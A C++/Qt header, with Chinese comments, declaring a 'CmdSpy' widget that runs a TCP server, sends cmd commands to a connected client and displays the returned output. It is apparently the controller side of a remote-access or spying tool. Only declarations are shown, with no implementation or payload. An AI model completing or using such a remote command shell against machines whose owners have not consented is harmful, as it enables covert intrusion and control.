/*
 *  Author: sumkee911@gmail.com
 *  Date: 2016-12-24
 *  Brief: 发送Cmd命令给客户端
 *
 */

#ifndef CMDSPY_H
#define CMDSPY_H

#include <QWidget>
#include <QApplication>
#include <QDesktopWidget>
#include <QTextEdit>
#include "tcpsocket.h"
#include "tcpserver.h"
#include <QLineEdit>
#include <QScrollBar>

class CmdSpy : public QWidget
{
    Q_OBJECT
public:
    explicit CmdSpy(QWidget *parent = 0);

    // 客户端发送到服务端的指令
    const QByteArray CmdPWD= "PWD";    // 当前文件位置

    // 结束符号
    const QByteArray CmdSplit = ";";
    const QByteArray CmdEnd = "\r\n";

    // 开始Cmd控制服务器，然后返回新的端口号
    int startCmdSpyServer(QString userName);

private:
    TcpServer *mServer;     // 服务端
    TcpSocket *mSock;       // 客户socket
    QTextEdit *mCmdRet;     // 显示框
    QLineEdit *mCmdEdit;    // 输入和发送cmd指令
    QString _curRet;        // 保存所有返回值

    // 发送指令
    void sendCommand(QString cmd);

    // 把返回数据加到edit框
    void addRetValue(QString retValue);

signals:

public slots:
    // 有新客户连接
    void newConnection(QTcpSocket *s);
    // 处理新数据
    void processBuffer();

    // 输入文本变化
    void textChanged();
    // 按了enter后就代表有新cmd指令需要发送
    void newCommand();

protected:
    // 大小重置
    void resizeEvent(QResizeEvent *);

    // 关闭
    void closeEvent(QCloseEvent *);
};

#endif // CMDSPY_H
